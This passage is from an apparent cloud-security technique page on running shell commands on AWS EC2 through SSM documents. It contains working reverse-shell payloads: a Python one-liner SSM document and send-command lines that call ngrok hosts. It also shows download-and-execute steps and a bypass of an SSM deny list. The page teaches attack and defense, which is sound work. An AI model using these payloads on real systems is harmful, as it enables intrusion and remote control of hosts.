</code></pre></div> <p>Because it is a GitHub repository, we have to specify more parameters than an HTTP server. Besides that, the parameters of interest are:</p> <ul> <li>InstallDependencies<ul> <li>Set to true for installing Ansible on the system</li> </ul> </li> <li>ExtraVariables<ul> <li>Here we specify the host and port where to receive the reverse shell</li> </ul> </li> </ul> <h5 id="aws-runansibleplaybook">AWS-RunAnsiblePlaybook<a class="headerlink" href="#aws-runansibleplaybook" title="Permanent link">Â¶</a></h5> <p>It does the same thing as AWS-ApplyAnsiblePlaybook with some differences:</p> <ul> <li>Can download only from S3 Buckets and HTTP(S) servers</li> <li>It requires Ansible to be already installed on the system</li> <li>The same Ansible Playbook can be used, but the command to send the command is different</li> </ul> <div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ssm<span class="w"> </span>send-command<span class="w"> </span>--document-name<span class="w"> </span><span class="s2">"AWS-RunAnsiblePlaybook"</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--instance-id<span class="w"> </span>i-0ecad5485f77f18f4<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--parameters<span class="w"> </span><span class="se">\</span>
<span class="s1">'{"playbookurl":["https://raw.githubusercontent.com/saw-your-packet/fun-with-ssm/main/AWS-RunAnsiblePlaybook/linux/reverse_shell.yml"],"extravars":["host=7.tcp.eu.ngrok.io port=14355"]}'</span>
</code></pre></div> <h5 id="aws-installpowershellmodule">AWS-InstallPowerShellModule<a class="headerlink" href="#aws-installpowershellmodule" title="Permanent link">Â¶</a></h5> <p>It downloads from remote locations PS modules and installs them. It only supports HTTP(S) servers.</p> <p>The way the document is build, it allows you to execute an arbitrary command after the module was installed. Because of this, the PS module doesnâ€™t need to be malicious.</p> <p>Example usage:</p> <div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ssm<span class="w"> </span>send-command<span class="w"> </span>--document-name<span class="w"> </span><span class="s2">"AWS-InstallPowerShellModule"</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--instance-id<span class="w"> </span>i-06ae9883fe6e5d721<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--parameters<span class="w"> </span><span class="s1">'{"source":["https://your-server.com/module.ps1"], "commands":["whoami"]}'</span>
</code></pre></div> <h5 id="aws-installapplication">AWS-InstallApplication<a class="headerlink" href="#aws-installapplication" title="Permanent link">Â¶</a></h5> <p>It downloads from remote locations MSI files and installs them. It only supports HTTP(S) servers. You can pass arguments to the MSI installation if want to. You need to be aware of AV at this point if the file is malicious.</p> <p>Example usage:</p> <div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ssm<span class="w"> </span>send-command<span class="w"> </span>--document-name<span class="w"> </span><span class="s2">"AWS-InstallApplication"</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--instance-id<span class="w"> </span>i-06ae9883fe6e5d721<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--parameters<span class="w"> </span><span class="s1">'{"action":["Install"], "parameters":["parameters"], "source":["https://your-server.com/file.msi"]}'</span>
</code></pre></div> <h5 id="aws-runremotescript">AWS-RunRemoteScript<a class="headerlink" href="#aws-runremotescript" title="Permanent link">Â¶</a></h5> <p>It downloads from remote locations scripts and executes them. It supports S3 Buckets and GitHub repositories. It works for both UNIX and Windows machines.</p> <p>Example usage:</p> <div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ssm<span class="w"> </span>send-command<span class="w"> </span>--document-name<span class="w"> </span><span class="s2">"AWS-RunRemoteScript"</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--instance-id<span class="w"> </span>i-06ae9883fe6e5d721<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--parameters<span class="w"> </span><span class="s1">'{"sourceType":["S3"], "sourceInfo":["{\"path\":\"s3://my-bucket/script.sh\"}"]}'</span>
</code></pre></div> <h5 id="aws-rundocument">AWS-RunDocument<a class="headerlink" href="#aws-rundocument" title="Permanent link">Â¶</a></h5> <p>Last, but not least, AWS-RunDocument. This is a special one. It downloads and executes other SSM Documents. Letâ€™s take a moment to understand this better.</p> <p>So, letâ€™s say the cloud engineer extended the deny list from the initial policy and blocked all the other SSM Documents presented above.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/post_exploitation/run_shell_commands_on_ec2/bad-block.png" data-desc-position="bottom"><img alt="bad-block" src="../../../images/aws/post_exploitation/run_shell_commands_on_ec2/bad-block.png"></a></p> <p>Well, if AWS-RunDocument is not blocked then the policy is useless. You can copy the content of, letâ€™s say, AWS-RunShellScript document, store it on your server and use AWS-RunDocument to execute a replica of the AWS-RunShellScript document, which will result in the exact outcome as if you would have used AWS-RunShellScript directly.</p> <p>It can downloads documents from GitHub repositories, S3 Buckets, HTTP(S) servers, but also can get a document as parameter from CLI. Same as for the other documents, you can create parameterized payloads that can be reused. It offers infinite possibilities in terms of what can you do.</p> <p>Here is an example of malicious SSM Document that will generate a reverse shell through python (I donâ€™t know why, but the Bash TCP payload doesnâ€™t work with AWS-RunDocument).</p> <p>Source: https://github.com/saw-your-packet/fun-with-ssm/blob/main/AWS-RunDocument/linux/Reverse-Shell-Python</p> <div class="highlight"><pre><span></span><code><span class="p">{</span>
<span class="w">  </span><span class="nt">"schemaVersion"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2.2"</span><span class="p">,</span>
<span class="w">  </span><span class="nt">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rev shell document linux"</span><span class="p">,</span>
<span class="w">  </span><span class="nt">"parameters"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">"host"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"(Required) Specify the host."</span><span class="p">,</span>
<span class="w">      </span><span class="nt">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"String"</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nt">"port"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"(Optional) Specify the port. The default value is 4444."</span><span class="p">,</span>
<span class="w">      </span><span class="nt">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"String"</span><span class="p">,</span>
<span class="w">      </span><span class="nt">"default"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4444"</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">},</span>
<span class="w">  </span><span class="nt">"mainSteps"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">      </span><span class="nt">"action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"aws:runShellScript"</span><span class="p">,</span>
<span class="w">      </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span>
<span class="w">      </span><span class="nt">"inputs"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">"runCommand"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">          </span><span class="s2">"port={{ port }}"</span><span class="p">,</span>
<span class="w">          </span><span class="s2">"host1={{ host }}"</span><span class="p">,</span>
<span class="w">          </span><span class="s2">"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"'$host1'\",'$port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"</span>
<span class="w">        </span><span class="p">]</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">]</span>
<span class="p">}</span>
</code></pre></div> <p>Example usage:</p> <div class="highlight"><pre><span></span><code>ws<span class="w"> </span>ssm<span class="w"> </span>send-command<span class="w"> </span>--document-name<span class="w"> </span><span class="s2">"AWS-RunDocument"</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--instance-id<span class="w"> </span>i-06ae9883fe6e5d721<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--parameters<span class="w"> </span><span class="s1">'{"sourceType":["GitHub"],"sourceInfo":["{\"owner\":\"saw-your-packet\", \"repository\":\"fun-with-ssm\", \"path\":\"AWS-RunDocument/linux/Reverse-Shell-Python\",\"getOptions\":\"branch:main\"}"], "documentParameters":["{\"host\":\"2.tcp.eu.ngrok.io\",\"port\":\"11448\"}"]}'</span>
</code></pre></div> <p>The parameter of interest is documentParameters which allow us to pass our host and port to the document. Cool, right?</p> <p>As an extension of this research, I started making malicious SSM documents. You can check them here: https://github.com/saw-your-packet/fun-with-ssm/tree/main/AWS-RunDocument</p> <p>More details about the advanced usage of SSM Run Command can be found in my talk: <a href="https://www.youtube.com/watch?v=SKXzwDy4vkw">The C2 tool no one talks about: AWS SSM â€“ Run Command at DefCamp 2023</a></p> <h2 id="session-manager">Session Manager<a class="headerlink" href="#session-manager" title="Permanent link">Â¶</a></h2> <div class="grid cards"> <ul> <li> <p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5zm0 6c1.4 0 2.8 1.1 2.8 2.5V11c.6 0 1.2.6 1.2 1.3v3.5c0 .6-.6 1.2-1.3 1.2H9.2c-.6 0-1.2-.6-1.2-1.3v-3.5c0-.6.6-1.2 1.2-1.2V9.5C9.2 8.1 10.6 7 12 7m0 1.2c-.8 0-1.5.5-1.5 1.3V11h3V9.5c0-.8-.7-1.3-1.5-1.3"></path></svg></span> <strong>Required IAM Permissions</strong></p> <hr> <ul> <li><a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ssm/start-session.html">ssm:StartSession</a></li> </ul> </li> </ul> </div> <p>If instead you'd like a more interactive shell experience, you can make use of <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html">Session Manager</a>. Session Manager allows you to have an SSH-esc experience, making it easy to interact with EC2 instances.</p> <p>To begin, you will first need to <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html">install the SSM Session Manager Plugin</a>. The specifics of this will depend on what operating system you are using.</p> <p>With that installed, you can then run the following command to start an interactive session.</p> <div class="highlight"><pre><span></span><code>aws ssm start-session --target instance-id
</code></pre></div> <aside class="md-source-file"> <span class="md-source-file__fact"> <span class="md-icon" title="Last update"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="December 6, 2024 22:32:07 UTC">December 6, 2024</span> </span> <span class="md-source-file__fact"> <span class="md-icon" title="Created"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"></path></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="April 11, 2022 23:11:43 UTC">April 11, 2022</span> </span> <span class="md-source-file__fact"> <span class="md-icon" title="Contributors"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12c0 4.42 2.87 8.17 6.84 9.5.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34-.46-1.16-1.11-1.47-1.11-1.47-.91-.62.07-.6.07-.6 1 .07 1.53 1.03 1.53 1.03.87 1.52 2.34 1.07 2.91.83.09-.65.35-1.09.63-1.34-2.22-.25-4.55-1.11-4.55-4.92 0-1.11.38-2 1.03-2.71-.1-.25-.45-1.29.1-2.64 0 0 .84-.27 2.75 1.02.79-.22 1.65-.33 2.5-.33s1.71.11 2.5.33c1.91-1.29 2.75-1.02 2.75-1.02.55 1.35.2 2.39.1 2.64.65.71 1.03 1.6 1.03 2.71 0 3.82-2.34 4.66-4.57 4.91.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0 0 12 2"></path></svg> </span> <span>GitHub</span> <nav> <a href="https://github.com/Frichetten" class="md-author" title="@Frichetten"> <img src="https://avatars.githubusercontent.com/u/10386884?v=4&amp;size=72" alt="Frichetten"> </a> </nav> </span> </aside> </article> </div> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> </main> <footer class="md-footer"> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class="md-copyright"> Made with <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener"> Material for MkDocs Insiders </a> </div> <div class="md-social"> <a href="https://infosec.exchange/@hackingthecloud" target="_blank" rel="noopener me" title="infosec.exchange" class="md-social__link"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M433 179.1c0-97.2-63.7-125.7-63.7-125.7-62.5-28.7-228.6-28.4-290.5 0 0 0-63.7 28.5-63.7 125.7 0 115.7-6.6 259.4 105.6 289.1 40.5 10.7 75.3 13 103.3 11.4 50.8-2.8 79.3-18.1 79.3-18.1l-1.7-36.9s-36.3 11.4-77.1 10.1c-40.4-1.4-83-4.4-89.6-54-.6-4.6-.9-9.3-.9-13.9 85.6 20.9 158.7 9.1 178.7 6.7 56.1-6.7 105-41.3 111.2-72.9 9.8-49.8 9-121.5 9-121.5zm-75.1 125.2h-46.6V190.1c0-49.7-64-51.6-64 6.9v62.5H201V197c0-58.5-64-56.6-64-6.9v114.2H90.3c0-122.1-5.2-147.9 18.4-175 25.9-28.9 79.8-30.8 103.8 6.1l11.6 19.5 11.6-19.5c24.1-37.1 78.1-34.8 103.8-6.1 23.7 27.3 18.4 53 18.4 175"></path></svg> </a> <a href="https://bsky.app/profile/hackingthe.cloud" target="_blank" rel="noopener" title="bsky.app" class="md-social__link"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M407.8 294.7c-3.3-.4-6.7-.8-10-1.3 3.4.4 6.7.9 10 1.3M288 227.1c-26.1-50.7-97.1-145.2-163.1-191.8C61.6-9.4 37.5-1.7 21.6 5.5 3.3 13.8 0 41.9 0 58.4S9.1 194 15 213.9c19.5 65.7 89.1 87.9 153.2 80.7 3.3-.5 6.6-.9 10-1.4-3.3.5-6.6 1-10 1.4-93.9 14-177.3 48.2-67.9 169.9C220.6 589.1 265.1 437.8 288 361.1c22.9 76.7 49.2 222.5 185.6 103.4 102.4-103.4 28.1-156-65.8-169.9-3.3-.4-6.7-.8-10-1.3 3.4.4 6.7.9 10 1.3 64.1 7.1 133.6-15.1 153.2-80.7C566.9 194 576 75 576 58.4s-3.3-44.7-21.6-52.9c-15.8-7.1-40-14.9-103.2 29.8C385.1 81.9 314.1 176.4 288 227.1"></path></svg> </a> <a href="https://x.com/HackingthCloud" target="_blank" rel="noopener" title="x.com" class="md-social__link"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"></path></svg> </a> <a href="https://www.linkedin.com/company/hacking-the-cloud/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"></path></svg> </a> <a href="https://github.com/Hacking-the-Cloud" target="_blank" rel="noopener" title="github.com" class="md-social__link"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg> </a> <a href="https://hackingthe.cloud/feed_rss_created.xml" target="_blank" rel="noopener" title="hackingthe.cloud" class="md-social__link"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M0 64c0-17.7 14.3-32 32-32 229.8 0 416 186.2 416 416 0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96 14.3 96 0 81.7 0 64m0 352a64 64 0 1 1 128 0 64 64 0 1 1-128 0m32-256c159.1 0 288 128.9 288 288 0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224-17.7 0-32-14.3-32-32s14.3-32 32-32"></path></svg> </a> </div> </div> </div> </footer> </div> <div class="md-dialog" data-md-component="dialog"> <div class="md-dialog__inner md-typeset"></div> </div> <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.indexes", "content.action.edit"], "search": "../../../assets/javascripts/workers/search.26099bd0.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script> <script src="../../../assets/javascripts/bundle.9d1edc04.min.js"></script> <script src="../../../javascripts/matomo.min.js"></script>  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(()=>{ lightbox.reload(); });
</script></body></html>